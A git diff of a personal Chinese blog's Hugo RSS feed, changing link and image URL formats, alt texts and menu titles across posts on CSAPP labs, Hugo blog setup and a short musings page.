-&lt;/h3&gt;&lt;p&gt;为节省空间，每一行代码都省略了后面的&lt;code&gt;ret&lt;/code&gt;，&lt;img src=&#34;http://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-e6b363c3011f34a0ca44db987f2c0d13_1440w.webp&#34;
+&lt;/h3&gt;&lt;p&gt;为节省空间，每一行代码都省略了后面的&lt;code&gt;ret&lt;/code&gt;，&lt;img src=&#34;chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-e6b363c3011f34a0ca44db987f2c0d13_1440w.webp&#34;
 	width=&#34;1132&#34;
 	height=&#34;796&#34;
-	srcset=&#34;http://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-e6b363c3011f34a0ca44db987f2c0d13_1440w_hu9797061224875917748.webp 480w, http://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-e6b363c3011f34a0ca44db987f2c0d13_1440w_hu17673280219868860253.webp 1024w&#34;
+	srcset=&#34;chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-e6b363c3011f34a0ca44db987f2c0d13_1440w_hu9797061224875917748.webp 480w, chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-e6b363c3011f34a0ca44db987f2c0d13_1440w_hu17673280219868860253.webp 1024w&#34;
 	loading=&#34;lazy&#34;
 	
-		alt=&#34;img&#34;
+		alt=&#34;图8&#34;
 	
 	
 		class=&#34;gallery-image&#34; 
@@ -732,11 +1971,11 @@
         </item>
         <item>
         <title>CSAPP:bomb实验</title>
-        <link>http://chenyuan1125.github.io/p/csappbomb%E5%AE%9E%E9%AA%8C/</link>
+        <link>chenyuan1125.github.io/p/csappbomb%E5%AE%9E%E9%AA%8C/</link>
         <pubDate>Sun, 29 Sep 2024 00:00:00 +0000</pubDate>
         
-        <guid>http://chenyuan1125.github.io/p/csappbomb%E5%AE%9E%E9%AA%8C/</guid>
-        <description>&lt;img src="http://chenyuan1125.github.io/p/csappbomb%E5%AE%9E%E9%AA%8C/1.jpg" alt="Featured image of post CSAPP:bomb实验" /&gt;&lt;h1 id=&#34;bomb实验&#34;&gt;Bomb实验
+        <guid>chenyuan1125.github.io/p/csappbomb%E5%AE%9E%E9%AA%8C/</guid>
+        <description>&lt;img src="chenyuan1125.github.io/chenyuan1125.github.io/p/csappbomb%E5%AE%9E%E9%AA%8C/1.jpg" alt="Featured image of post CSAPP:bomb实验" /&gt;&lt;h1 id=&#34;bomb实验&#34;&gt;Bomb实验
 &lt;/h1&gt;&lt;h2 id=&#34;题目解析&#34;&gt;题目解析
 &lt;/h2&gt;&lt;p&gt;注意：本人所写的注释可能有些错误，有问题还请大家批评指正，注释中*的用法和C语言类似，有些寄存器名称没有带%&lt;/p&gt;
 &lt;p&gt;题目只给了一个main函数，我们可以大致看出来，它的模式是从某个地方读取字符串，然后作为参数输入每个关卡&lt;code&gt;phase_&lt;/code&gt;，进行验证。具体的情况没有显示，说明我们需要通过某种手段去进行探查：&lt;/p&gt;
@@ -767,13 +2006,13 @@
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;说明可以通过文件读取的方式进行读取。&lt;/p&gt;
 &lt;p&gt;寄存器说明：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://chenyuan1125.github.io/p/csappbomb%E5%AE%9E%E9%AA%8C/assets/image-20240106202523168.png&#34;
+&lt;p&gt;&lt;img src=&#34;chenyuan1125.github.io/p/csappbomb%E5%AE%9E%E9%AA%8C/assets/image-20240106202523168.png&#34;
 	width=&#34;1724&#34;
 	height=&#34;804&#34;
-	srcset=&#34;http://chenyuan1125.github.io/p/csappbomb%E5%AE%9E%E9%AA%8C/assets/image-20240106202523168_hu9272793004077583584.png 480w, http://chenyuan1125.github.io/p/csappbomb%E5%AE%9E%E9%AA%8C/assets/image-20240106202523168_hu2869656510892282907.png 1024w&#34;
+	srcset=&#34;chenyuan1125.github.io/p/csappbomb%E5%AE%9E%E9%AA%8C/assets/image-20240106202523168_hu9272793004077583584.png 480w, chenyuan1125.github.io/p/csappbomb%E5%AE%9E%E9%AA%8C/assets/image-20240106202523168_hu2869656510892282907.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
-		alt=&#34;image-20240106202523168&#34;
+		alt=&#34;图1:寄存器说明&#34;
 	
 	
 		class=&#34;gallery-image&#34; 
@@ -781,13 +2020,13 @@
 		data-flex-basis=&#34;514px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://chenyuan1125.github.io/p/csappbomb%E5%AE%9E%E9%AA%8C/assets/image-20240107114435272.png&#34;
+&lt;p&gt;&lt;img src=&#34;chenyuan1125.github.io/p/csappbomb%E5%AE%9E%E9%AA%8C/assets/image-20240107114435272.png&#34;
 	width=&#34;1736&#34;
 	height=&#34;789&#34;
-	srcset=&#34;http://chenyuan1125.github.io/p/csappbomb%E5%AE%9E%E9%AA%8C/assets/image-20240107114435272_hu4644931881825792889.png 480w, http://chenyuan1125.github.io/p/csappbomb%E5%AE%9E%E9%AA%8C/assets/image-20240107114435272_hu14912383351731075300.png 1024w&#34;
+	srcset=&#34;chenyuan1125.github.io/p/csappbomb%E5%AE%9E%E9%AA%8C/assets/image-20240107114435272_hu4644931881825792889.png 480w, chenyuan1125.github.io/p/csappbomb%E5%AE%9E%E9%AA%8C/assets/image-20240107114435272_hu14912383351731075300.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
-		alt=&#34;image-20240107114435272&#34;
+		alt=&#34;图2:寄存器说明&#34;
 	
 	
 		class=&#34;gallery-image&#34; 
@@ -1952,61 +3191,12 @@
 </description>
         </item>
         <item>
-        <title>个人介绍</title>
-        <link>http://chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E4%BB%8B%E7%BB%8D/</link>
-        <pubDate>Thu, 09 Mar 2023 00:00:00 +0000</pubDate>
-        
-        <guid>http://chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E4%BB%8B%E7%BB%8D/</guid>
-        <description>&lt;img src="http://chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E4%BB%8B%E7%BB%8D/1.jpg" alt="Featured image of post 个人介绍" /&gt;&lt;h2 id=&#34;校园经历&#34;&gt;校园经历
-&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;2019.09 - 2021.06&lt;/strong&gt;                &lt;strong&gt;社会实践部部长&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;处理学院社会实践等相关事宜&lt;/li&gt;
-&lt;li&gt;带领志愿服务团队开展志愿服务活动&lt;/li&gt;
-&lt;li&gt;组织团队参加志愿服务大赛并荣获湖南省志愿服务大赛金奖。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;strong&gt;2021.06 - 2022.06&lt;/strong&gt;                &lt;strong&gt;校园招聘助理&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;负责对接学校承办的各类招聘会，通过与企业的沟通为学生筛选出优质企业&lt;/li&gt;
-&lt;li&gt;同时向企业推荐一些优秀毕业生，从而提高学校的就业水平和质量，营造良好的就业氛围&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;strong&gt;2021.09 - 2022.06&lt;/strong&gt;             &lt;strong&gt;可视化智慧农业小程序项目负责人&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;带领项目团队参加挑战杯大学生课外学术科技作品竞赛&lt;/li&gt;
-&lt;li&gt;主要负责微信小程序的后台开发&lt;/li&gt;
-&lt;li&gt;软件架构：SpringBoot+MyBatis+Maven+Redis+Vue+jdk1.8&lt;/li&gt;
-&lt;li&gt;利用ffmpeg实现实时视频的推流和拉流&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;荣誉奖项&#34;&gt;荣誉奖项
-&lt;/h2&gt;&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;国家级：国家励志奖学金&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;省级：湖南省志愿服务大赛金奖&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;校级：优秀学生干部、优秀青年志愿者、三好学生、“挑战杯”大学生课外学术科技作品竞赛二等奖、&amp;ldquo;互联网+&amp;ldquo;创新创业竞赛二等奖、&amp;ldquo;创青春&amp;quot;大学生创业计划竞赛二等奖、暑假&amp;quot;三下乡&amp;quot;社会实践活动&amp;quot;优秀个人&amp;rdquo;&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;专业技能&#34;&gt;专业技能
-&lt;/h2&gt;&lt;ul&gt;
-&lt;li&gt;熟悉Java，熟悉Spring、SpringMVC、SpringBoot、Mybatis-plus等常用开源框架&lt;/li&gt;
-&lt;li&gt;熟悉MySQL，能够熟练编写sql语句，了解Redis等缓存技术&lt;/li&gt;
-&lt;li&gt;熟悉JQuery、JavaScript、JSP、ajax、css、xml等web技术&lt;/li&gt;
-&lt;li&gt;熟悉常见的开发辅助工具Git、maven等&lt;/li&gt;
-&lt;li&gt;熟悉tomcat，掌握常用的通信协议，了解常用设计模式，数据结构及算法&lt;/li&gt;
-&lt;li&gt;熟悉Linux环境，基本操作，服务器环境搭建及部署，了解Linux开发和shell编程。&lt;/li&gt;
-&lt;li&gt;熟悉抓包、爬虫、利用ffmpeg进行音视频开发&lt;/li&gt;
-&lt;/ul&gt;
-</description>
-        </item>
-        <item>
         <title>个人博客搭建</title>
-        <link>http://chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</link>
+        <link>chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</link>
         <pubDate>Thu, 09 Mar 2023 00:00:00 +0000</pubDate>
         
-        <guid>http://chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</guid>
-        <description>&lt;img src="http://chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1.jpg" alt="Featured image of post 个人博客搭建" /&gt;&lt;h2 id=&#34;hugo介绍&#34;&gt;Hugo介绍
+        <guid>chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</guid>
+        <description>&lt;img src="chenyuan1125.github.io/chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1.jpg" alt="Featured image of post 个人博客搭建" /&gt;&lt;h2 id=&#34;hugo介绍&#34;&gt;Hugo介绍
 &lt;/h2&gt;&lt;p&gt;Hugo是由Go语言实现的静态网站生成器。简单、易用、高效、易扩展、快速部署。&lt;/p&gt;
 &lt;p&gt;Hugo中文文档地址： &lt;a class=&#34;link&#34; href=&#34;https://www.gohugo.org&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;https://www.gohugo.org&lt;/a&gt;&lt;/p&gt;
@@ -2021,10 +3211,10 @@
 &lt;/ul&gt;
 &lt;ul&gt;
 &lt;li&gt;
-&lt;p&gt;&lt;img src=&#34;http://chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1.png&#34;
+&lt;p&gt;&lt;img src=&#34;chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1.png&#34;
 	width=&#34;1182&#34;
 	height=&#34;641&#34;
-	srcset=&#34;http://chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1_hu11021774570254940286.png 480w, http://chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1_hu12394334276154959691.png 1024w&#34;
+	srcset=&#34;chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1_hu11021774570254940286.png 480w, chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1_hu12394334276154959691.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -2067,10 +3257,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;生成myblog文件夹&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20230313114148771.png&#34;
+&lt;p&gt;&lt;img src=&#34;chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20230313114148771.png&#34;
 	width=&#34;818&#34;
 	height=&#34;166&#34;
-	srcset=&#34;http://chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20230313114148771_hu13276562593006187076.png 480w, http://chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20230313114148771_hu7003390564660789143.png 1024w&#34;
+	srcset=&#34;chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20230313114148771_hu13276562593006187076.png 480w, chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20230313114148771_hu7003390564660789143.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -2086,13 +3276,13 @@
 &lt;p&gt;建议安装方法：&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;
-&lt;p&gt;将下载好的主题解压放入myblog文件夹下的themes下&lt;/p&gt;
+&lt;p&gt;将下载好的主题解压放入之前new出来的文件夹(我这里是myblog)文件夹下的themes下&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;并在myblog/config.toml里加一行 theme=xxxx（解压后的主题文件夹的名称）&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;把exampleSite的文件复制放到myblog文件夹下&lt;/p&gt;
+&lt;p&gt;把主题中的config.yaml或toml文件复制放到myblog文件夹下&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;启动站点&lt;/p&gt;
@@ -2204,7 +3394,7 @@
 &lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git add .
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git commit -m ‘first commit’
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git push
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git push origin master
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;可能存在的问题：&lt;/p&gt;
@@ -2219,55 +3409,50 @@
 </description>
         </item>
         <item>
-        <title>Archives</title>
-        <link>http://chenyuan1125.github.io/archives/</link>
-        <pubDate>Tue, 28 May 2019 00:00:00 +0000</pubDate>
+        <title>随想录</title>
+        <link>chenyuan1125.github.io/p/%E9%9A%8F%E6%83%B3%E5%BD%95/</link>
+        <pubDate>Thu, 09 Mar 2023 00:00:00 +0000</pubDate>
         
-        <guid>http://chenyuan1125.github.io/archives/</guid>
-        <description></description>
-        </item>
-        <item>
-        <title>About</title>
-        <link>http://chenyuan1125.github.io/about/</link>
-        <pubDate>Thu, 28 Feb 2019 00:00:00 +0000</pubDate>
-        
-        <guid>http://chenyuan1125.github.io/about/</guid>
-        <description>&lt;p&gt;Written in Go, Hugo is an open source static site generator available under the &lt;a class=&#34;link&#34; href=&#34;https://github.com/gohugoio/hugo/blob/master/LICENSE&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;Apache License 2.0.&lt;/a&gt; Hugo supports TOML, YAML and JSON data file types, Markdown and HTML content files and uses shortcodes to add rich content. Other notable features are taxonomies, multilingual mode, image processing, custom output formats, HTML/CSS/JS minification and support for Sass SCSS workflows.&lt;/p&gt;
-&lt;p&gt;Hugo makes use of a variety of open source projects including:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/yuin/goldmark&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://github.com/yuin/goldmark&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/alecthomas/chroma&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://github.com/alecthomas/chroma&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/muesli/smartcrop&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://github.com/muesli/smartcrop&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/spf13/cobra&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://github.com/spf13/cobra&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/spf13/viper&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://github.com/spf13/viper&lt;/a&gt;&lt;/li&gt;
+        <guid>chenyuan1125.github.io/p/%E9%9A%8F%E6%83%B3%E5%BD%95/</guid>
+        <description>&lt;img src="chenyuan1125.github.io/chenyuan1125.github.io/p/%E9%9A%8F%E6%83%B3%E5%BD%95/1.jpg" alt="Featured image of post 随想录" /&gt;&lt;h1 id=&#34;随想录&#34;&gt;随想录
+&lt;/h1&gt;&lt;h2 id=&#34;一些很好的话&#34;&gt;一些很好的话
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;世界上没有直路，要准备走曲折的路。&lt;/li&gt;
+&lt;li&gt;只要我不放弃的话缘分就会一直下去。&lt;/li&gt;
+&lt;li&gt;躺平有时，奋斗又是，发疯有时，理性有时，但最终我们依然向往的是一种正向的东西，而不是一种虚伪的东西。&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;Hugo is ideal for blogs, corporate websites, creative portfolios, online magazines, single page applications or even a website with thousands of pages.&lt;/p&gt;
-&lt;p&gt;Hugo is for people who want to hand code their own website without worrying about setting up complicated runtimes, dependencies and databases.&lt;/p&gt;
-&lt;p&gt;Websites built with Hugo are extremely fast, secure and can be deployed anywhere including, AWS, GitHub Pages, Heroku, Netlify and any other hosting provider.&lt;/p&gt;
-&lt;p&gt;Learn more and contribute on &lt;a class=&#34;link&#34; href=&#34;https://github.com/gohugoio&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;GitHub&lt;/a&gt;.&lt;/p&gt;
 </description>
         </item>
         <item>
-        <title>Links</title>
-        <link>http://chenyuan1125.github.io/links/</link>
-        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+        <title>归档</title>
+        <link>chenyuan1125.github.io/archives/</link>
+        <pubDate>Tue, 28 May 2019 00:00:00 +0000</pubDate>
         
-        <guid>http://chenyuan1125.github.io/links/</guid>
+        <guid>chenyuan1125.github.io/archives/</guid>
         <description></description>
         </item>
         <item>
-        <title>Search</title>
-        <link>http://chenyuan1125.github.io/search/</link>
+        <title>关于</title>
+        <link>chenyuan1125.github.io/%E5%85%B3%E4%BA%8E/</link>
+        <pubDate>Thu, 28 Feb 2019 00:00:00 +0000</pubDate>
+        
+        <guid>chenyuan1125.github.io/%E5%85%B3%E4%BA%8E/</guid>
+        <description></description>
+        </item>
+        <item>
+        <title>链接</title>
+        <link>chenyuan1125.github.io/%E9%93%BE%E6%8E%A5/</link>
         <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
         
-        <guid>http://chenyuan1125.github.io/search/</guid>
+        <guid>chenyuan1125.github.io/%E9%93%BE%E6%8E%A5/</guid>
+        <description></description>
+        </item>
+        <item>
+        <title>搜索</title>
+        <link>chenyuan1125.github.io/search/</link>
+        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+        
+        <guid>chenyuan1125.github.io/search/</guid>
         <description></description>
         </item>
         
